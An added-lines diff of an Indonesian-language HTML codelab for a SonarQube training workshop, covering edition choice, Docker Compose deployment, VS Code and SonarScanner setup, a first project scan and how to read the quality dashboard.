+<tr><td colspan="1" rowspan="1"><p><strong>Portfolio / Application View</strong></p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Security Reports</strong> (OWASP Top 10, CWE Top 25)</p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Regulatory Reports</strong> (PDF export)</p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Parallel Report Processing</strong></p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>High Availability</strong> (HA / redundancy)</p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>❌</p>
+</td><td colspan="1" rowspan="1"><p>✅</p>
+</td></tr>
+</table>
+<aside class="special"><p><strong>Untuk training ini kita menggunakan Community Edition</strong> — sudah cukup untuk belajar dan untuk banyak tim development. Fitur utama yang &#34;hilang&#34; di Community adalah <strong>Branch Analysis</strong> dan <strong>PR Decoration</strong>, yang baru terasa penting saat sudah integrate ke CI/CD pipeline.</p>
+</aside>
+<p><strong>Kapan perlu upgrade?</strong></p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Kebutuhan</p>
+</td><td colspan="1" rowspan="1"><p>Edisi Minimum</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Belajar / tim kecil / project personal</p>
+</td><td colspan="1" rowspan="1"><p><strong>Community</strong> (gratis)</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Scan PR otomatis + branch analysis</p>
+</td><td colspan="1" rowspan="1"><p><strong>Developer</strong></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Laporan OWASP/CWE untuk audit/compliance</p>
+</td><td colspan="1" rowspan="1"><p><strong>Enterprise</strong></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p>Organisasi besar, butuh HA &amp; zero downtime</p>
+</td><td colspan="1" rowspan="1"><p><strong>Data Center</strong></p>
+</td></tr>
+</table>
+<aside class="warning"><p><strong>Jangan langsung beli edisi mahal.</strong> Mulai dari Community, evaluasi apakah fitur gratisnya sudah cukup. Kebanyakan tim baru butuh upgrade ke Developer setelah pipeline CI/CD-nya sudah matang dan butuh scan per-branch/PR.</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Modul 3 - Setup Environment &amp; Tools" duration="20">
+        <h2 is-upgraded>Arsitektur Workshop Kita</h2>
+<p>Dalam workshop ini, kita menggunakan setup yang mirip dengan environment production:</p>
+<p class="image-container"><img alt="Arsitektur Workshop" src="img\\99a2c127153a861e.png"></p>
+<aside class="special"><p> Server SonarQube untuk training ini <strong>sudah disiapkan</strong> oleh trainer. Anda cukup setup tools di laptop untuk mengikuti hands-on.</p>
+</aside>
+<h2 is-upgraded>Bagaimana SonarQube Di-deploy?</h2>
+<p>Bagian ini menjelaskan proses deploy SonarQube server dari nol menggunakan Docker Compose. Langkah-langkah di bawah digunakan untuk deploy di <strong>VPS/server</strong>, tapi Anda juga bisa <strong>install di laptop sendiri</strong> menggunakan Docker Desktop untuk eksperimen pribadi.</p>
+<aside class="special"><p><strong>Ingin coba install sendiri?</strong> Jika Anda sudah punya <strong>Docker Desktop</strong> (Windows/Mac) atau <strong>Docker Engine</strong> (Linux) di laptop, Anda bisa langsung loncat ke <strong>Langkah 3</strong> — buat <code>docker-compose.yml</code>, jalankan <code>docker compose up -d</code>, lalu akses <code>http://localhost:9000</code>. Tidak perlu VPS!</p>
+</aside>
+<h3 is-upgraded>Prasyarat Server</h3>
+<p>SonarQube membutuhkan <strong>minimal</strong>:</p>
+<ul>
+<li><strong>VPS/Server</strong>: 4 GB RAM, 2 vCPU, 30 GB SSD</li>
+<li><strong>OS</strong>: Ubuntu 22.04 / 24.04 (recommended)</li>
+<li><strong>Docker</strong> + <strong>Docker Compose</strong> terinstall</li>
+</ul>
+<h3 is-upgraded>Langkah 1: Install Docker</h3>
+<pre><code language="language-bash" class="language-bash"># Tambahkan Docker repository
+sudo install -m 0755 -d /etc/apt/keyrings
+sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg \
+  -o /etc/apt/keyrings/docker.asc
+
+echo &#34;deb [arch=$(dpkg --print-architecture) \
+  signed-by=/etc/apt/keyrings/docker.asc] \
+  https://download.docker.com/linux/ubuntu \
+  $(. /etc/os-release &amp;&amp; echo ${VERSION_CODENAME}) stable&#34; | \
+  sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null
+
+# Install Docker Engine + Compose Plugin
+sudo apt update
+sudo apt install -y docker-ce docker-ce-cli containerd.io \
+  docker-buildx-plugin docker-compose-plugin
+</code></pre>
+<h3 is-upgraded>Langkah 2: Konfigurasi Kernel</h3>
+<p>SonarQube menggunakan <strong>Elasticsearch</strong> secara internal, yang membutuhkan pengaturan kernel tertentu. <strong>Tanpa ini, SonarQube akan crash saat startup.</strong></p>
+<pre><code language="language-bash" class="language-bash"># Set kernel parameters (wajib untuk Elasticsearch)
+sudo sysctl -w vm.max_map_count=524288
+sudo sysctl -w fs.file-max=131072
+
+# Persist setelah reboot
+echo &#34;vm.max_map_count=524288&#34; | sudo tee -a /etc/sysctl.conf
+echo &#34;fs.file-max=131072&#34; | sudo tee -a /etc/sysctl.conf
+</code></pre>
+<aside class="warning"><p><strong>Kenapa </strong><strong><code>vm.max_map_count</code></strong><strong>?</strong> Elasticsearch memetakan file ke memory (mmap). Default Linux hanya 65536, tapi Elasticsearch butuh minimal 262144. Kita set 524288 untuk headroom.</p>
+</aside>
+<h3 is-upgraded>Langkah 3: Buat Docker Compose File</h3>
+<pre><code language="language-bash" class="language-bash">mkdir -p ~/sonarqube &amp;&amp; cd ~/sonarqube
+</code></pre>
+<p>Buat file <code>docker-compose.yml</code> dengan isi berikut:</p>
+<pre><code language="language-yaml" class="language-yaml">services:
+  sonarqube:
+    image: sonarqube:lts-community
+    container_name: sonarqube
+    depends_on:
+      db:
+        condition: service_healthy
+    ports:
+      - &#34;9000:9000&#34;
+    environment:
+      SONAR_JDBC_URL: jdbc:postgresql://db:5432/sonarqube
+      SONAR_JDBC_USERNAME: sonarqube
+      SONAR_JDBC_PASSWORD: sonarqube_pass_2026
+    volumes:
+      - sonarqube_data:/opt/sonarqube/data
+      - sonarqube_extensions:/opt/sonarqube/extensions
+      - sonarqube_logs:/opt/sonarqube/logs
+    ulimits:
+      nofile:
+        soft: 131072
+        hard: 131072
+      nproc:
+        soft: 8192
+        hard: 8192
+    restart: unless-stopped
+
+  db:
+    image: postgres:16
+    container_name: sonarqube_db
+    environment:
+      POSTGRES_USER: sonarqube
+      POSTGRES_PASSWORD: sonarqube_pass_2026
+      POSTGRES_DB: sonarqube
+    volumes:
+      - postgresql_data:/var/lib/postgresql/data
+    healthcheck:
+      test: [&#34;CMD-SHELL&#34;, &#34;pg_isready -U sonarqube&#34;]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+    restart: unless-stopped
+
+volumes:
+  sonarqube_data:
+  sonarqube_extensions:
+  sonarqube_logs:
+  postgresql_data:
+</code></pre>
+<p><strong>Penjelasan komponen:</strong></p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Service</p>
+</td><td colspan="1" rowspan="1"><p>Fungsi</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>sonarqube</strong></p>
+</td><td colspan="1" rowspan="1"><p>Server utama SonarQube (web UI + compute engine + Elasticsearch). Menggunakan image <code>lts-community</code> (versi Long Term Support gratis).</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>db</strong></p>
+</td><td colspan="1" rowspan="1"><p>PostgreSQL 16 sebagai database backend. Menyimpan konfigurasi, hasil analisis, metrics, dan history project.</p>
+</td></tr>
+</table>
+<p><strong>Penjelasan konfigurasi penting:</strong></p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Config</p>
+</td><td colspan="1" rowspan="1"><p>Penjelasan</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><code>depends_on: condition: service_healthy</code></p>
+</td><td colspan="1" rowspan="1"><p>SonarQube <strong>menunggu</strong> PostgreSQL benar-benar siap sebelum start, menghindari crash karena DB belum ready.</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><code>SONAR_JDBC_URL</code></p>
+</td><td colspan="1" rowspan="1"><p>Connection string JDBC agar SonarQube tahu cara connect ke PostgreSQL.</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><code>volumes</code></p>
+</td><td colspan="1" rowspan="1"><p>Data di-persist ke Docker volume, sehingga <strong>data tidak hilang</strong> saat container di-restart.</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><code>ulimits</code></p>
+</td><td colspan="1" rowspan="1"><p>Override limit OS di dalam container — wajib untuk Elasticsearch.</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><code>healthcheck</code></p>
+</td><td colspan="1" rowspan="1"><p>PostgreSQL melakukan self-check tiap 10 detik menggunakan <code>pg_isready</code>.</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><code>restart: unless-stopped</code></p>
+</td><td colspan="1" rowspan="1"><p>Container otomatis restart jika crash atau setelah server reboot.</p>
+</td></tr>
+</table>
+<h3 is-upgraded>Langkah 4: Jalankan &amp; Verifikasi</h3>
+<pre><code language="language-bash" class="language-bash"># Start semua container (background mode)
+sudo docker compose up -d
+
+# Cek status container
+sudo docker compose ps
+
+# Lihat log SonarQube (tunggu &#34;SonarQube is operational&#34;)
+sudo docker compose logs -f sonarqube
+</code></pre>
+<h3 is-upgraded>Langkah 5: Buka Firewall &amp; Akses</h3>
+<pre><code language="language-bash" class="language-bash">sudo ufw allow OpenSSH
+sudo ufw allow 9000/tcp
+sudo ufw enable
+</code></pre>
+<p>Setelah itu, akses <strong>http://IP-SERVER:9000</strong> di browser. Login pertama kali dengan <code>admin</code> / <code>admin</code>, lalu ganti password.</p>
+<aside class="special"><p><strong>Untuk DevOps/Infra engineer</strong>: Panduan di atas bisa langsung Anda gunakan untuk deploy SonarQube di environment Anda (VPS, on-premise server, atau cloud VM).</p>
+<p><strong>Untuk Developer</strong>: Jika hanya ingin coba-coba, cukup install Docker Desktop di laptop, copy <code>docker-compose.yml</code> di atas, dan jalankan <code>docker compose up -d</code>. SonarQube akan tersedia di <code>http://localhost:9000</code>.</p>
+</aside>
+<h2 is-upgraded>Step 1: Install SonarQube for IDE di VS Code</h2>
+<p><strong>SonarQube for IDE</strong> (dulu bernama <strong>SonarLint</strong>) memberikan feedback kualitas kode <strong>real-time</strong> langsung di editor Anda - seperti spell-check, tapi untuk kode.</p>
+<aside class="warning"><p><strong>Catatan:</strong> Extension ini sudah di-rebrand oleh SonarSource. Jika Anda mencari &#34;SonarLint&#34; di marketplace, Anda <strong>tidak akan menemukannya</strong>. Cari dengan kata kunci <strong>&#34;SonarQube&#34;</strong> sebagai gantinya.</p>
+</aside>
+<ol type="1">
+<li>Buka <strong>VS Code</strong></li>
+<li>Klik ikon <strong>Extensions</strong> (atau tekan <code>Ctrl+Shift+X</code>)</li>
+<li>Cari: <strong>SonarQube</strong></li>
+<li>Pilih <strong>&#34;SonarQube for IDE&#34;</strong> dari <strong>SonarSource</strong></li>
+<li>Klik <strong>Install</strong></li>
+<li>Restart VS Code jika diminta</li>
+</ol>
+<p class="image-container"><img alt="Install SonarQube for IDE" src="img\\cb00b369fc85ee9c.png"></p>
+<p>Setelah install, extension langsung <strong>aktif</strong> dan akan menandai issue di editor Anda dengan garis bawah (squiggly line) - mirip seperti error TypeScript.</p>
+<h2 is-upgraded>Step 2: Install SonarScanner CLI</h2>
+<p><strong>SonarScanner</strong> digunakan untuk mengirim kode dari laptop Anda ke SonarQube server untuk analisis lengkap.</p>
+<p><strong>Install via npm (recommended):</strong></p>
+<pre><code language="language-bash" class="language-bash">npm install -g sonarqube-scanner
+</code></pre>
+<p><strong>Verifikasi:</strong></p>
+<pre><code language="language-bash" class="language-bash">sonar-scanner --version
+</code></pre>
+<p>Anda seharusnya melihat output seperti:</p>
+<pre><code>SonarScanner X.X.X
+Java XX.X.X ...
+</code></pre>
+<aside class="warning"><p> Jika error &#34;sonar-scanner is not recognized&#34;, pastikan npm global bin ada di PATH. Coba tutup dan buka ulang terminal.</p>
+</aside>
+<aside class="warning"><p><strong>Khusus Windows - PowerShell Execution Policy Error:</strong> Jika muncul error <code>"cannot be loaded because running scripts is disabled on this system"</code>, jalankan perintah ini di PowerShell terlebih dahulu:</p>
+<pre><code>Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
+</code></pre>
+<p>Ketik <strong>Y</strong> lalu Enter untuk konfirmasi. Setelah itu coba jalankan <code>sonar-scanner --version</code> lagi.</p>
+<p>Ini terjadi karena Windows secara default memblokir eksekusi script <code>.ps1</code>. Perintah di atas mengizinkan script yang didownload (seperti sonar-scanner) untuk berjalan.</p>
+</aside>
+<h2 is-upgraded>Step 3: Akses SonarQube Server</h2>
+<ol type="1">
+<li>Buka browser, navigasi ke: <code>http://sonar-training.duckdns.org</code></li>
+<li>Login dengan credential yang diberikan trainer</li>
+<li><strong>Ganti password</strong> jika diminta</li>
+</ol>
+<p class="image-container"><img alt="SonarQube Login" src="img\\192b8eb9ec798294.png"></p>
+<h2 is-upgraded>Step 4: Explore SonarQube UI</h2>
+<p>Setelah login, explore halaman utama:</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Menu</p>
+</td><td colspan="1" rowspan="1"><p>Fungsi</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Projects</strong></p>
+</td><td colspan="1" rowspan="1"><p>Daftar semua project yang sudah di-scan</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Issues</strong></p>
+</td><td colspan="1" rowspan="1"><p>Semua issue yang ditemukan</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Rules</strong></p>
+</td><td colspan="1" rowspan="1"><p>Daftar semua rules yang tersedia</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Quality Profiles</strong></p>
+</td><td colspan="1" rowspan="1"><p>Kumpulan rules per bahasa</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Quality Gates</strong></p>
+</td><td colspan="1" rowspan="1"><p>Kondisi pass/fail</p>
+</td></tr>
+</table>
+<p class="image-container"><img alt="SonarQube Dashboard" src="img\\192b8eb9ec798294.png"></p>
+<h2 is-upgraded>Step 5: Connect SonarQube for IDE ke SonarQube Server</h2>
+<p>Agar SonarQube for IDE di VS Code sinkron dengan rules di server:</p>
+<ol type="1">
+<li>Buka VS Code → <strong>Settings</strong> (Ctrl+,)</li>
+<li>Cari: <code>sonarlint.connectedMode</code></li>
+<li>Atau edit <code>settings.json</code>, tambahkan:</li>
+</ol>
+<pre><code language="language-json" class="language-json">{
+  &#34;sonarlint.connectedMode.connections.sonarqube&#34;: [
+    {
+      &#34;serverUrl&#34;: &#34;http://sonar-training.duckdns.org&#34;,
+      &#34;token&#34;: &#34;YOUR_TOKEN_HERE&#34;
+    }
+  ]
+}
+</code></pre>
+<ol type="1" start="4">
+<li>Untuk generate token: Buka SonarQube → klik avatar → <strong>My Account</strong> → <strong>Security</strong> → <strong>Generate Token</strong></li>
+</ol>
+<p class="image-container"><img alt="Generate Token SonarQube" src="img\\778d04db2e0bb489.png"></p>
+<ol type="1" start="5">
+<li>Isi form generate token seperti ini:</li>
+</ol>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Field</p>
+</td><td colspan="1" rowspan="1"><p>Isi yang disarankan</p>
+</td><td colspan="1" rowspan="1"><p>Penjelasan</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Name</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>vscode-sonarqube-training</code></p>
+</td><td colspan="1" rowspan="1"><p>Nama bebas untuk membedakan token ini dengan token lain. Gunakan nama yang jelas agar mudah dikenali saat nanti ingin di-rotate atau di-revoke.</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Type</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>User Token</code></p>
+</td><td colspan="1" rowspan="1"><p>Pilih ini untuk koneksi dari VS Code ke SonarQube Server. Token ini mewakili akun Anda saat extension membaca project, rules, dan konfigurasi dari server.</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Expires in</strong></p>
+</td><td colspan="1" rowspan="1"><p><code>30 days</code> untuk lab, atau pilih masa berlaku lebih panjang jika memang perlu</p>
+</td><td colspan="1" rowspan="1"><p>Menentukan kapan token otomatis kadaluarsa. Setelah expired, koneksi SonarQube for IDE akan gagal sampai Anda membuat token baru dan memperbarui <code>settings.json</code>.</p>
+</td></tr>
+</table>
+<ol type="1" start="6">
+<li>Klik <strong>Generate</strong></li>
+<li>Klik <strong>Copy</strong> lalu paste token ke field <code>token</code> di <code>settings.json</code></li>
+</ol>
+<p>Token hanya ditampilkan sekali setelah dibuat. Jika terlewat, Anda harus revoke token lama lalu generate token baru.</p>
+<p>Token pada langkah ini khusus untuk <strong>Connected Mode di VS Code</strong>. Nanti pada <strong>Modul 4</strong> Anda akan membuat <strong>token analisis project</strong> saat setup project di SonarQube. Jadi memang ada dua token, tetapi fungsinya berbeda:</p>
+<ul>
+<li><strong>User Token</strong>: dipakai oleh SonarQube for IDE di VS Code</li>
+<li><strong>Project token / token analisis</strong>: dipakai di <code>sonar-project.properties</code> saat menjalankan <code>sonar-scanner</code></li>
+</ul>
+<aside class="special"><p> Sekarang SonarQube for IDE di VS Code Anda terhubung ke SonarQube server! Issue yang muncul di editor akan konsisten dengan rules di server.</p>
+</aside>
+<h2 is-upgraded>✅ Checklist</h2>
+<p>Pastikan semua sudah ready sebelum lanjut:</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Yang dicek</p>
+</td><td colspan="1" rowspan="1"><p>Target</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>SonarQube for IDE</strong></p>
+</td><td colspan="1" rowspan="1"><p>Extension sudah terinstall di VS Code</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>SonarScanner</strong></p>
+</td><td colspan="1" rowspan="1"><p>Perintah <code>sonar-scanner --version</code> berhasil di terminal</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Akses server</strong></p>
+</td><td colspan="1" rowspan="1"><p>Bisa login ke <code>http://sonar-training.duckdns.org</code></p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Connected Mode</strong></p>
+</td><td colspan="1" rowspan="1"><p>SonarQube for IDE sudah terhubung ke server</p>
+</td></tr>
+</table>
+<aside class="special"><p> Semua tools siap! Selanjutnya kita akan melakukan scanning project pertama.</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Modul 4 - Scanning Project Pertama Anda" duration="25">
+        <h2 is-upgraded>Setup Project</h2>
+<h3 is-upgraded>Step 1: Siapkan Project</h3>
+<p>Jika Anda sudah punya <strong>project pribadi</strong> yang ingin dianalisis, Anda boleh langsung menggunakan project tersebut dan lanjut ke konfigurasi SonarQube.</p>
+<p>Jika <strong>belum punya project untuk latihan</strong>, gunakan sample project dari GitHub berikut:</p>
+<pre><code language="language-bash" class="language-bash">git clone https://github.com/mpuhambyah/sonarqube-training-ts-buggy.git
+cd sonarqube-training-ts-buggy
+npm install
+</code></pre>
+<aside class="special"><p> Intinya, pada modul ini Anda bisa memilih salah satu:</p>
+<ul>
+<li>pakai <strong>project pribadi</strong> Anda sendiri</li>
+<li>atau clone <strong>sample project</strong> dari repo <code>mpuhambyah</code> jika ingin langsung mengikuti hands-on yang sama dengan materi training</li>
+</ul>
+</aside>
+<h3 is-upgraded>Step 2: Buat Project di SonarQube</h3>
+<ol type="1">
+<li>Buka SonarQube → <strong>Projects</strong> → <strong>Create Project</strong></li>
+<li>Pilih <strong>Manually</strong></li>
+<li>Isi:</li>
+</ol>
+<ul>
+<li><strong>Project display name:</strong> bebas, misalnya <code>Aplikasi Inventory Bagas</code></li>
+<li><strong>Project key:</strong> bebas, misalnya <code>inventory-bagas</code></li>
+</ul>
+<ol type="1" start="4">
+<li>Klik <strong>Set Up</strong></li>
+<li>Pada halaman berikutnya, pilih dulu <strong>repository / analysis method</strong></li>
+</ol>
+<p class="image-container"><img alt="Integrate Repository SonarQube" src="img\\c4b2c995644d5748.png"></p>
+<p>Di halaman ini SonarQube menampilkan beberapa opsi integrasi, termasuk beberapa <strong>favorite CI</strong> seperti GitHub Actions, GitLab CI, Azure Pipelines, atau Jenkins.</p>
+<p>Maksud dari opsi-opsi itu adalah:</p>
+<ul>
+<li>SonarQube ingin tahu apakah analisis akan dijalankan otomatis dari pipeline CI/CD</li>
+<li>Jika Anda memilih salah satu CI, SonarQube akan menampilkan panduan dan snippet konfigurasi yang sesuai dengan platform tersebut</li>
+<li>Opsi ini cocok jika project Anda memang sudah terhubung ke repository dan pipeline build otomatis</li>
+</ul>
+<p>Untuk workshop ini, pilih <strong>Locally</strong> karena:</p>
+<ul>
+<li>Kita ingin peserta menjalankan scan langsung dari laptop lebih dulu agar alurnya mudah dipahami</li>
+<li>Setup lokal lebih cepat untuk hands-on dibanding harus menyiapkan pipeline CI/CD di awal</li>
+<li>File <code>sonar-project.properties</code> dan perintah <code>npx sonar-scanner</code> lebih mudah dipelajari sebelum masuk ke integrasi CI/CD pada modul berikutnya</li>
+</ul>
+<ol type="1" start="6">
+<li>Pilih <strong>Locally</strong></li>
+<li>Generate <strong>token project</strong> → copy dan simpan</li>
+</ol>
+<p class="image-container"><img alt="Create Project SonarQube" src="img\\5bb965ca8c1862bf.png"></p>
+<p><strong>Catatan penting:</strong></p>
+<ul>
+<li>Nilai <strong>Project display name</strong> akan dipakai lagi pada <code>sonar.projectName</code></li>
+<li>Nilai <strong>Project key</strong> akan dipakai lagi pada <code>sonar.projectKey</code></li>
+<li>Token yang dibuat pada tahap setup project ini akan dipakai pada <code>sonar.login</code></li>
+</ul>
+<p>Saat token project selesai dibuat, tampilannya akan seperti ini:</p>
+<p class="image-container"><img alt="Generate Token Project SonarQube" src="img\\e376afe804b42e38.png"></p>
+<p>Setelah klik <strong>Generate</strong>, SonarQube akan menampilkan hasil token seperti ini:</p>
+<p class="image-container"><img alt="Generate Token Project SonarQube Result" src="img\\9a18b211015b38c8.png"></p>
+<p>Klik <strong>Copy</strong>, lalu paste token tersebut ke file <code>sonar-project.properties</code>, tepatnya pada bagian:</p>
+<pre><code language="language-properties" class="language-properties">sonar.login=YOUR_PROJECT_TOKEN_HERE
+</code></pre>
+<aside class="special"><p> Supaya tidak tertukar dengan token VS Code pada modul sebelumnya, anggap token di langkah ini sebagai <strong>token untuk scan project</strong>.</p>
+</aside>
+<h3 is-upgraded>Step 3: Buat sonar-project.properties</h3>
+<p>Buat file <code>sonar-project.properties</code> di root project. Ganti nilai sesuai dengan project Anda:</p>
+<pre><code language="language-properties" class="language-properties">sonar.projectKey=YOUR_PROJECT_KEY
+sonar.projectName=YOUR_PROJECT_NAME
+sonar.sources=src
+sonar.host.url=http://sonar-training.duckdns.org
+sonar.login=YOUR_PROJECT_TOKEN_HERE
+
+# TypeScript specific
+sonar.typescript.lcov.reportPaths=coverage/lcov.info
+sonar.exclusions=**/node_modules/**,**/dist/**
+</code></pre>
+<p><strong>Contoh yang sudah diisi</strong> (berdasarkan project key dan nama yang dibuat di langkah sebelumnya):</p>
+<pre><code language="language-properties" class="language-properties">sonar.projectKey=inventory-bagas
+sonar.projectName=Aplikasi Inventory Bagas
+sonar.sources=src
+sonar.host.url=http://sonar-training.duckdns.org
+sonar.login=sqp_xxxxxxxxxxxxxxxxxxxx
+
+# TypeScript specific
+sonar.typescript.lcov.reportPaths=coverage/lcov.info
+sonar.exclusions=**/node_modules/**,**/dist/**
+</code></pre>
+<p>Penjelasan mapping-nya:</p>
+<ul>
+<li><code>sonar.projectKey</code> diisi dari field <strong>Project key</strong> saat create project</li>
+<li><code>sonar.projectName</code> diisi dari field <strong>Project display name</strong> saat create project</li>
+<li><code>sonar.login</code> diisi dengan <strong>token project</strong> yang baru saja di-generate pada langkah sebelumnya</li>
+</ul>
+<aside class="special"><p><strong>Lupa project key?</strong> Buka project Anda di SonarQube, lalu lihat URL di browser. Project key ada di parameter <code>id=</code>, contoh:</p>
+<pre><code>http://sonar-training.duckdns.org/dashboard?id=inventory-bagas
+</code></pre>
+<p>Nilai <code>inventory-bagas</code> itulah yang dipakai sebagai <code>sonar.projectKey</code>.</p>
+</aside>
+<aside class="special"><p> Di environment lab ini, penggunaan <code>sonar.login</code> untuk token analisis project sudah teruji dan bisa langsung dipakai saat menjalankan scanner.</p>
+</aside>
+<h3 is-upgraded>Step 4: Run Scanner!</h3>
+<pre><code language="language-bash" class="language-bash">npx sonar-scanner
+</code></pre>
+<p>Tunggu sampai selesai. Anda akan melihat output seperti:</p>
+<pre><code>17:24:03.852 INFO  Analysis total time: 25.099 s
+17:24:03.855 INFO  EXECUTION SUCCESS
+17:24:03.856 INFO  Total time: 39.915s
+[INFO]  Bootstrapper: SonarScanner CLI finished successfully
+</code></pre>
+<p>Jika log Anda mirip seperti di atas, berarti proses scan sudah sukses dan hasil analisis sudah terkirim ke SonarQube Server.</p>
+<h3 is-upgraded>Step 5: Lihat Hasil di Dashboard</h3>
+<ol type="1">
+<li>Buka SonarQube → <strong>Projects</strong></li>
+<li>Klik project Anda</li>
+<li>Perhatikan dashboard project Anda — tampilannya akan seperti ini:</li>
+</ol>
+<p class="image-container"><img alt="SonarQube Project Dashboard" src="img\\f25467bf31e35e6f.png"></p>
+<ol type="1" start="4">
+<li>Catat temuan berikut: <ul>
+<li>Berapa <strong>Bugs</strong> ditemukan?</li>
+<li>Berapa <strong>Vulnerabilities</strong>?</li>
+<li>Berapa <strong>Code Smells</strong>?</li>
+<li>Apa <strong>Rating</strong> untuk Reliability, Security, Maintainability?</li>
+<li>Berapa persentase <strong>Duplication</strong>?</li>
+</ul>
+</li>
+</ol>
+<h2 is-upgraded>Membaca Dashboard: Kenapa &#34;Passed&#34; padahal Ada Temuan?</h2>
+<aside class="special"><p><strong>Pertanyaan umum: </strong><em>&#34;Kok Quality Gate-nya PASSED, padahal ada 4 Bugs dan 16 Code Smells?&#34;</em></p>
+</aside>
+<p>Ini membingungkan di awal, tapi begini cara melihatnya:</p>
+<p><strong>Quality Gate &#34;Sonar Way&#34; hanya mengecek kode BARU</strong> - bukan keseluruhan kode. Karena ini scan pertama, SonarQube menganggap semua kode sebagai <em>existing code</em>, bukan <em>new code</em>. Hasilnya, kondisi Quality Gate tidak ada yang dilanggar → <strong>PASSED</strong>.</p>
+<table>
+<tr><td colspan="1" rowspan="1"><p>Metrik di Dashboard</p>
+</td><td colspan="1" rowspan="1"><p>Penjelasan</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>Quality Gate: Passed</strong></p>
+</td><td colspan="1" rowspan="1"><p>Semua kondisi di Quality Gate terpenuhi — pada scan pertama, ini wajar karena belum ada &#34;new code&#34;</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>4 Bugs / Reliability C</strong></p>
+</td><td colspan="1" rowspan="1"><p>Ada 4 bug yang ditemukan di keseluruhan kode. Rating C berarti ada minimal 1 major bug</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>0 Vulnerabilities / Security A</strong></p>
+</td><td colspan="1" rowspan="1"><p>Tidak ada celah keamanan yang terdeteksi — kode sudah aman untuk aspek ini</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>6 Security Hotspots / Security Review E</strong></p>
+</td><td colspan="1" rowspan="1"><p>Ada 6 bagian kode yang perlu direview manual. Rating E karena 0% sudah di-review — bukan berarti semuanya berbahaya</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>16 Code Smells / Maintainability A</strong></p>
+</td><td colspan="1" rowspan="1"><p>Ada 16 code smell, namun debt ratio masih rendah sehingga Maintainability tetap A</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>3h 40min Debt</strong></p>
+</td><td colspan="1" rowspan="1"><p>Estimasi waktu yang dibutuhkan untuk memperbaiki semua code smell</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>0.0% Coverage</strong></p>
+</td><td colspan="1" rowspan="1"><p>Belum ada unit test — ini normal untuk project baru yang belum ditest</p>
+</td></tr>
+<tr><td colspan="1" rowspan="1"><p><strong>8.7% Duplication</strong></p>
+</td><td colspan="1" rowspan="1"><p>8.7% kode terduplikasi — sedikit di atas batas ideal (&lt; 3%)</p>
+</td></tr>
+</table>
